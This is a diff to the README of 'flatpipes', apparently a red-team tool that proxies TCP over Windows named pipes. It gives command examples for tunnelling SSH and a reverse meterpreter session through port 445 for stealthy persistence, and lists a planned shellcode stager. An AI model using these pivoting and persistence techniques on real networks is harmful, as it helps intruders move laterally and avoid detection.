@@ -5,7 +5,7 @@ A TCP proxy over named pipes. Originally created for maintaining a meterpreter s
 
 Since it seems it can help in various situations, let's list a few:
 
-#### TCP 10001 Chat over Named Pipe
+#### - TCP 10001 Chat over Named Pipe
 
 On the 1st Windows host (pipe server): *flatpipes.exe pserver sserver pipename . 127.0.0.1 10001*
 > The above will create two pipes "pipename_s2c" & "pipename_c2s" and as soon as negotiation is ok will open a TCP listener at 10001
@@ -15,7 +15,7 @@ On the 2nd Windows host (pipe client): *flatpipes.exe pclient sserver pipename X
 
 Finally, netcat on the two hosts on their listeners and chat with yourself.
 
-#### Bring a remote port here
+#### - Bring a remote port here
 
 Let's suppose you have access on the MS Fileserver through a Windows "jumphost" workstation. You want to ensure all communications are over 445 since it is normal for workstation to DC. We need to access SSH on another system in the server LAN but we can only connect to MS Fileserver 445 (and eg WMI for command exec)
 
@@ -27,7 +27,8 @@ On the jumphost: *flatpipes.exe pclient sserver pipename 10.0.2.10 127.0.0.1 22*
 
 Just ssh on 127.0.0.1 22 and you are through the town portal
 
-#### Reverse TCP meterpreter through pipes
+
+#### - Reverse TCP meterpreter through pipes
 On the MS Fileserver again and you want to maintain persistence, but over 445. You want reverse TCP meterpreter but also you want the jumphost to initiate the 445 connection.
 
 On the MS Fileserver: *flatpipes.exe pserver sserver pipename . 127.0.0.1 54321*
@@ -39,13 +40,13 @@ On the jumphost: *flatpipes.exe pclient sclient pipename 10.0.2.10 IP_OF_METERPR
 What this means is that we can exchange directions, eg use a reverse exploitation, but make the opposite network traffic. It is like an encapsulation over DNS, just needs some familiarization.
 
 ---
-ps. I don't know exactly (or have time to read) the details of CreateNamedPipe access controls. So I assume from MSDN that by using NULL security descriptor we allow RW access to Admins/System/Creator and R to everyone/anon. On the workstation that acts as a pipe client I test using eg *runas /user:server\tester /netonly "flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001"*. What happens with */netonly* is that you force an ntlm2 challenge response for all the pipe access requirements of the calls issued by flatpipes.
+*ps* I don't know exactly (or have time to read) the details of CreateNamedPipe access controls. So I assume from MSDN that by using NULL security descriptor we allow RW access to Admins/System/Creator and R to everyone/anon. On the workstation that acts as a pipe client I test using eg *runas /user:server\tester /netonly "flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001"*. What happens with */netonly* is that you force an ntlm2 challenge response for all the pipe access requirements of the calls issued by flatpipes.
 
 I hope it will help. It is not very well-written, I welcome comments / looking for feedback.
 
 <dl>
   <dt>Todo</dt>
-  <dd>Include a meterpreter bind/reverse stager (exec will C# virtualalloc / createthread)</dd>
+  <dd>Include a meterpreter bind/reverse stager (exec will C# virtualalloc / createthread) - Almost there</dd>
   <dd>"Monkey patch" the above stager to change port on the fly (on hex)</dd>
   <dd>Exception handling. Asap when pipe auth does not work</dd>
   <dd>Think any other useful scenarios</dd> 
